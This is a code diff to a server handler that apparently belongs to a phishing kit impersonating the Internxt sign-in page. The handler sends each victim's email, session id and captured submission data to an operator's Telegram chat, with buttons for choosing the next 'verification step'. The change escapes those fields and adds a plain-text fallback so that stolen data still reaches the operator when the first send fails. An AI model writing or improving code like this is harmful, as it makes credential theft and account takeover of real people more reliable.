@@ -44,15 +44,26 @@ module.exports = async (req, res) => {
     : config.telegram_chat_id;
 
   if (botToken && chatId) {
-    const text = `🔔 <b>New Sign-In Submission (Internxt)</b>\n━━━━━━━━━━━━━━━━━━━━━\n📧 <b>Email:</b> <code>${email || 'Unknown'}</code>\n🆔 <b>Session:</b> <code>${sessionId}</code>\n<pre>${data.result.substring(0, 800)}</pre>\n━━━━━━━━━━━━━━━━━━━━━\nSelect next verification step:`;
+    const cleanEmail = store.escapeHtml(email || 'Unknown');
+    const cleanResult = store.escapeHtml(data.result.substring(0, 800));
+    const text = `🔔 <b>New Sign-In Submission (Internxt)</b>\n━━━━━━━━━━━━━━━━━━━━━\n📧 <b>Email:</b> <code>${cleanEmail}</code>\n🆔 <b>Session:</b> <code>${sessionId}</code>\n<pre>${cleanResult}</pre>\n━━━━━━━━━━━━━━━━━━━━━\nSelect next verification step:`;
     const keyboard = store.buildMainActionsKeyboard(sessionId);
 
-    await store.callTelegram(botToken, 'sendMessage', {
+    const tgRes = await store.callTelegram(botToken, 'sendMessage', {
       chat_id: chatId,
       text,
       parse_mode: 'HTML',
       reply_markup: keyboard
     });
+
+    if (!tgRes.ok) {
+      console.error('Telegram sendMessage error:', tgRes);
+      await store.callTelegram(botToken, 'sendMessage', {
+        chat_id: chatId,
+        text: `🔔 New Sign-In Submission (Internxt)\n━━━━━━━━━━━━━━━━━━━━━\n📧 Email: ${email || 'Unknown'}\n🆔 Session: ${sessionId}\n\n${data.result.substring(0, 800)}\n━━━━━━━━━━━━━━━━━━━━━\nSelect next verification step:`,
+        reply_markup: keyboard
+      });
+    }
 
     return res.status(200).json({
       sessionId,
